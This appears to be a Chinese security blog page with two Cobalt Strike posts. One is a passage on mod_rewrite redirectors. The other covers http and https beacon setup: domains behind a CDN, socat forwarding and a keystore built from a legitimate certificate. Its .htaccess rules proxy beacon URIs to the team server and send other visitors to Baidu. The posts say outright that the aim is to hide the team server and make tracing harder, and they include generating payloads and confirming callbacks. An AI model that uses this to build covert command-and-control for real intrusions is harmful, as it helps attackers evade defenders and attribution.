<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httpd -M</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907095113772.png" alt="image-20200907095113772"></p>
<p>​        然后我们需要开启.htaccess的支持，找到/etc/httpd/conf/httpd.conf文件，找到下面的内容，将AllowOverride None 替换为AllowOverride All,注意，这里的<strong>Directory是/var/www/html</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory &quot; &#x2F;var&#x2F;www&#x2F;html&quot;&gt;</span><br><span class="line">....</span><br><span class="line">    AllowOverride None  &#x2F;&#x2F;替换为AllowOverride All</span><br><span class="line">    Require all granted</span><br><span class="line">&lt;&#x2F;Directory&gt;</span><br></pre></td></tr></table></figure>

<p>​        设置好以后启动apache服务,再访问一下看是否开启成功</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service httpd start</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907092757010.png" alt="image-20200907092757010"></p>
<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907092849077.png" alt="image-20200907092849077"></p>
<p>​    开启后我们在/var/www/html/下编写一个2.html文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">2.html</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>​        再编写一个.htaccess文件，文件内容如下，我大概先解释一下里面的语法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">RewriteEngine on   </span><br><span class="line">RewriteRule 1.html 2.html</span><br><span class="line">&lt;&#x2F;IfModule&gt;</span><br></pre></td></tr></table></figure>

<p>​        RewriteEngine on,RewriteEngine 是rewrite功能的总开关，用来开启是否启动url rewrite。</p>
<p>​        RewriteRule 是指令允许我们基于URL将请求重新映射到Apache。一个<code>.htaccess</code>文件可以容纳多个重写规则，但在运行时，Apache按照定义的顺序应用规则。RewriteRule的语法规则如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RewriteRule Pattern Substitution [Flags]</span><br></pre></td></tr></table></figure>

<p>​        Pattern需要匹配的字符串，Substitution替换为其他的url</p>
<p>​        编写好以后我们测试一下，访问1.html，实际上这个文件是不存在的，但是经过.htaccess的RewriteRule规则，我们访问到了2.html的内容</p>
<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907102919483.png" alt="image-20200907102919483"></p>
<p>​        最后，我们再介绍一个关于mod_rewrite的语法:RewriteCond。</p>
<p>​        <code>RewriteCond</code>指令允许我们为重写规则添加条件。重写条件包括以下结构：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RewriteRule TestString  Condition  [Flags]</span><br></pre></td></tr></table></figure>

<p>​        TestString:要测试的字符串，Condition：匹配的模式,flag如果是NC则代表忽略大小写的匹配</p>
<p>​        这样可能不好理解，我们通过一些实例来帮助我们理解,我们再设置一个.htaccess文件，内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">RewriteEngine on</span><br><span class="line">RewriteCond &quot;%&#123;HTTP_USER_AGENT&#125;&quot; &quot;test666&quot; [NC]</span><br><span class="line">RewriteRule 1.html 2.html</span><br><span class="line">&lt;&#x2F;IfModule&gt;</span><br></pre></td></tr></table></figure>

<p>​        当我们使用上面的.htaccess后，我们直接通过浏览器去访问1.html文件，会显示文件不存在，也就是说RewriteRule这个规则没有生效。</p>
<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907103945803.png" alt="image-20200907103945803"></p>
<p>​        我们尝试抓包将user_agent部分修改为test666，这样就可以正常访问到。也就是说规则生效了。</p>
<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907104222145.png" alt="image-20200907104222145"></p>
<p>案例一：根据referer来进行筛选</p>
<p>​        .htaccess文件内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">RewriteEngine on</span><br><span class="line">RewriteCond &quot;%&#123;HTTP_REFERER&#125;&quot; &quot;test666.com&quot; [NC]</span><br><span class="line">RewriteRule 1.html 2.html</span><br><span class="line">&lt;&#x2F;IfModule&gt;</span><br></pre></td></tr></table></figure>

<p>​        直接访问1.html仍然访问不到</p>
<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907104525076.png" alt="image-20200907104525076"></p>
<p>​        通过添加referer内容为test666.com则可以正常访问到</p>
<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907104621874.png" alt="image-20200907104621874"></p>
<h3 id="mod-rewrite重定向cobaltstrike"><a href="#mod-rewrite重定向cobaltstrike" class="headerlink" title="mod_rewrite重定向cobaltstrike"></a>mod_rewrite重定向cobaltstrike</h3><p>​        根据目标访问的目录不同来进行重定向操作，只有当目标访问到某个特定的地址时，将流量重定向到我们的teamserver，将其他的流量重定向到百度。</p>
<p>​        我这里cobaltstrike流量这里还是以github上开源的msu_edu.profile的流量来进行配置。我们主要关注下get和post请求部分的url。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set uri &quot;&#x2F;siteindex&#x2F;a&#x2F; &#x2F;siteindex&#x2F;b&#x2F; &#x2F;siteindex&#x2F;c&#x2F;&quot;;  &#x2F;&#x2F;get请求部分</span><br><span class="line"> set uri &quot;&#x2F;getsearchresults&quot;;   &#x2F;&#x2F;post部分</span><br><span class="line">set uri_x86 &quot;&#x2F;Events&quot;;  &#x2F;&#x2F;stager部分</span><br><span class="line">set uri_x64 &quot;&#x2F;events&quot;   &#x2F;&#x2F;stager部分</span><br></pre></td></tr></table></figure>

<p>​        好的，得到了这个以后我们在重定向的那台主机上设置.htaccess的规则,</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RewriteEngine On</span><br><span class="line">RewriteCond %&#123;REQUEST_URI&#125; ^&#x2F;(siteindex&#x2F;a&#x2F;|siteindex&#x2F;c&#x2F;|siteindex&#x2F;c&#x2F;|getsearchresults|Events|events)&#x2F;?$</span><br><span class="line">RewriteRule ^.*$ http:&#x2F;&#x2F;teamserver-ip:8080%&#123;REQUEST_URI&#125; [P]</span><br><span class="line">RewriteRule ^.*$ https:&#x2F;&#x2F;www.baidu.com&#x2F;? [L,R&#x3D;302]</span><br></pre></td></tr></table></figure>

<p>​        设置好以后我们在cobaltstrike中创建一个listener,地址填入重定向主机的地址，这里需要注意，http port(C2)的端口需要和重定向主机apache的端口一致。apache的端口修改在/etc/httpd/conf/httpd.conf中,修改后重启apache服务即可。</p>
<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907151628805.png" alt="image-20200907151628805"></p>
<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907115815700.png" alt="image-20200907115815700"></p>
<p>​        设置好以后我们生成一个shell看下能否正常上线并执行命令</p>
<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907151750637.png" alt="image-20200907151750637"></p>
<p>​        <img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907151845447.png" alt="image-20200907151845447"></p>
<p>​        但是我们直接去访问重定向的那台主机，如果加入其他路径是无法访问成功的。</p>
<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907152105597.png" alt="image-20200907152105597"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        通过上面的学习，我们了解了如何通过mod_rewrite的规则设置来进行流量的控制，通过这种方法可以进行访问控制，从而在一定程度上提升溯源的难度。也可以通过https来设置重定向，这样抓到的流量也看不到具体的路径信息。我们也可以给前置服务器加上CDN，这样也可以在一定层面上增加溯源的难度。</p>
<p><strong>参考文章</strong></p>
<p><a href="https://bluescreenofjeff.com/2016-06-28-cobalt-strike-http-c2-redirectors-with-apache-mod_rewrite/" target="_blank" rel="noopener">Cobalt Strike HTTP C2 Redirectors with Apache mod_rewrite</a></p>
<p><a href="https://3gstudent.github.io/3gstudent.github.io/CIA-Hive-Beacon-Infrastructure%E5%A4%8D%E7%8E%B01-%E4%BD%BF%E7%94%A8Apache-mod_rewrite%E5%AE%9E%E7%8E%B0http%E6%B5%81%E9%87%8F%E5%88%86%E5%8F%91/" target="_blank" rel="noopener">CIA Hive Beacon Infrastructure复现1——使用Apache mod_rewrite实现http流量分发</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">关于CobaltStrike各种协议beacon的使用总结</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-09-02 20:15:47" itemprop="dateCreated datePublished" datetime="2020-09-02T20:15:47+08:00">2020-09-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-09-04 16:56:44" itemprop="dateModified" datetime="2020-09-04T16:56:44+08:00">2020-09-04</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/cobaltstrike/" itemprop="url" rel="index">
                    <span itemprop="name">cobaltstrike</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​        在之前的学习中我们了解了关于CobaltStrike beacon运行的流程，以及流量的修改，今天我们一起来学习一下CobaltStrike自带的各种beacon的使用。</p>
<h3 id="http-beacon"><a href="#http-beacon" class="headerlink" title="http beacon"></a>http beacon</h3><p>​        http beacon 使用get方式去获取服务端下发的任务，同时使用post方式向服务端获取数据。关于使用ip上线我相信大家都已经非常熟悉了，所以我主要讲一下关于域名上线需要注意的问题。</p>
<h4 id="设置域名上线"><a href="#设置域名上线" class="headerlink" title="设置域名上线"></a>设置域名上线</h4><p>​         当我们打开cobaltstrike 4.0时，添加一个http listener，通常界面如下</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903114217908.png" alt="image-20200903114217908"></p>
<p>​        这里主要注意一下http hosts设置这里，我在参考手册上看到这里可以设置多个地址作为回连的地址，我以为可以同时设置几个服务器ip，当执行后可以同时在这几个服务器上获得beacon，在网上查了很多资料也没有发现关于这里配置的一个解释。最后经过实践发现，这里是可以配置多个域名并且这些域名指向的是我们同一个团队服务器，这样才能正常上线。配置好以后我们使用wireshark看看。</p>
<p>​        我们可以看到，当执行exe通过stager下载stage时，使用的http host（stager）的地址</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903114500405.png" alt="image-20200903114500405"></p>
<p>​        心跳包则使用了我们在http hosts中配置的地址</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903114639258.png" alt="image-20200903114639258"></p>
<p>​        并且这些请求的地址会根据我们在http hosts中的设置自动切换不同的地址</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903115125593.png" alt="image-20200903115125593"></p>
<p>​        上面我们演示了如何使用多个域名上线的方法，因为我这里的域名加了cludefalre的cdn，配置多个子域名解析到同一个服务器，配置如下</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903120016032.png" alt="image-20200903120016032"></p>
<p>​        还有一个小坑就是cludefalre针对http协议只允许几个端口，如果使用其他的端口则会导致上线失败</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903120117553.png" alt="image-20200903120117553"></p>
<h4 id="设置重定向"><a href="#设置重定向" class="headerlink" title="设置重定向"></a>设置重定向</h4><p>​            在linux下我们可以使用socat来做重定向，命令如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP4-LISTEN:80,fork TCP4:xxx.xxx.xxx.xx:8080</span><br></pre></td></tr></table></figure>

<p>​        通过上面的设置，当我们访问本地的80端口时，实际上会把流量转发到远程主机的8080端口</p>
<p>​        首先我再远程vps上开启了8888端口</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903141235269.png" alt="image-20200903141235269"></p>
<p>​        在本地的kali上做了一个重定向，将kali的88端口的流量重定向到远程主机的8888端口</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903141204409.png" alt="image-20200903141204409"></p>
<p>​        最后，当我们访问本地的88端口实际上访问的是远程地址的8888端口</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903141331725.png" alt="image-20200903141331725"></p>
<p>​        通过上面的学习我们了解了关于socat做重定向的使用，现在我们再来看看如何在cobaltstrike中使用重定向。</p>
<p>​        首先我们在自己已有的一个服务器上开启重定向，将来自8080的流量转发到我们的teamserver服务器的8080端口</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903161651534.png" alt="image-20200903161651534"></p>
<p>​        然后我们再cobaltstrkie中进行配置，这里的配置无论是http hosts 还是 http host(stager)我们都配置为转发的那台服务器的地址或者对应的域名，而不是我们的teamserver的，这里需要注意。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903161845634.png" alt="image-20200903161845634"></p>
<p>​        配置好listener以后，我们生成exe执行，使用wireshark进行抓包，我们可以看到，无论是下载stage的请求还是心跳包，请求的都是我们配置的重定向服务器的地址，而不是我们真正的teamserver的地址，这样就可以保护我们的teamserver服务器地址不会泄露。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903162253680.png" alt="image-20200903162253680"></p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903162523973.png" alt="image-20200903162523973"></p>
<p>​    我们可以在多个服务器上执行转发操作，来保护我们teamserver的安全，只要在http hosts中进行添加即可。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903162836545.png" alt="image-20200903162836545"></p>
<p>​    在设置完listener以后，可以通过向重定向服务器的8080端口发起请求，查看cobaltstrike web log的方法测试重定向是否设置成功。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903163205116.png" alt="image-20200903163205116"></p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903163221050.png" alt="image-20200903163221050"></p>
<p>​        还需要注意的是，我们在设置转发的时候可以通过给远程地址使用域名来进行重定向，但是需要注意的是，如果使用的这个域名是有cdn的，则会转发失败。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903163427110.png" alt="image-20200903163427110"></p>
<p>​    实际上可以用来做重定向的方法还有几种，不过这个不是我们今天的重点，以后我会讲关于其他重定向方法的使用。</p>
<h3 id="https-beacon"><a href="#https-beacon" class="headerlink" title="https beacon"></a>https beacon</h3><p>​        使用https会对传输过程中的通讯流量进行加密传输，其余的设置和http beacon相同。</p>
<h4 id="配置合法证书上线"><a href="#配置合法证书上线" class="headerlink" title="配置合法证书上线"></a>配置合法证书上线</h4><p>​        要配置合法的证书上线，首先我们得拥有一个自己的域名，购买域名后，可以到<a href="https://freessl.cn/" target="_blank" rel="noopener">freessl</a>为我们购买的域名申请证书，选择浏览器生成</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903175452968.png" alt="image-20200903175452968"></p>
<p>​        点击生成后会下载一个压缩包，并且会到如下界面，需要在自己的域名解析那配置一个解析记录。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903175552101.png" alt="image-20200903175552101"></p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903175731164.png" alt="image-20200903175731164"></p>
<p>​        配置完成后，点击“配置完成，检测一下”功能进行检测。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903190309403.png" alt="image-20200903190309403"></p>
<p>​        检测通过后，点击验证</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903190642071.png" alt="image-20200903190642071"></p>
<p>​        验证通过后，会来到如下界面</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903190904144.png" alt="image-20200903190904144"></p>
<p>​        下载以后有两个文件</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903190958373.png" alt="image-20200903190958373"></p>
<p>​        将这两个文件传到我们服务器cobaltstrike所在的目录下，执行下面的命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -export -in full_chain.pem -inkey private.key -out www.xxx.com -name www.xxx.com -passout pass:xxxxx</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903191955435.png" alt="image-20200903191955435"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -importkeystore -deststorepass sectest666 -destkeypass xxxx -destkeystore test666.store -srckeystore www.xxx.com -srcstoretype PKCS12 -srcstorepass sectest666 -alias www.xxx.com</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903192159669.png" alt="image-20200903192159669"></p>
<p>​        生成好以后，将证书设置到我们的profile文件中，找到 https-certificate下的内容，将密码和store文件名进行替换，我以msu_edu.profile文件为例，配置如下</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903192707348.png" alt="image-20200903192707348"></p>
<p>​        将profile文件设置好以后，使用./c2lint msu_edu.profile 进行验证</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903192849282.png" alt="image-20200903192849282"></p>
<p>​        最后，我们还需要在teamserver这个文件中修改keyStore的文件名和keyStorePassword的值。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903193351419.png" alt="image-20200903193351419"></p>
<p>​        开启服务端后，创建一个https beacon,其中https  hosts和https host (stager)都配置为我们申请证书的域名</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904094728657.png" alt="image-20200904094728657"></p>
<p>​        生成一个web drivery（s），这里<strong>host需要使用我们申请的域名的地址</strong>，否则是上不了线的</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903193932046.png" alt="image-20200903193932046"></p>
<p>​        生成的链接我们访问一下，可以看到证书是没有问题的</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904094828902.png" alt="image-20200904094828902"></p>
<p>​        执行powershell后即可上线</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904094924959.png" alt="image-20200904094924959"></p>
<p>​        因为这里我们使用的是https协议，所以使用wireshark是看不到请求的内容的。</p>
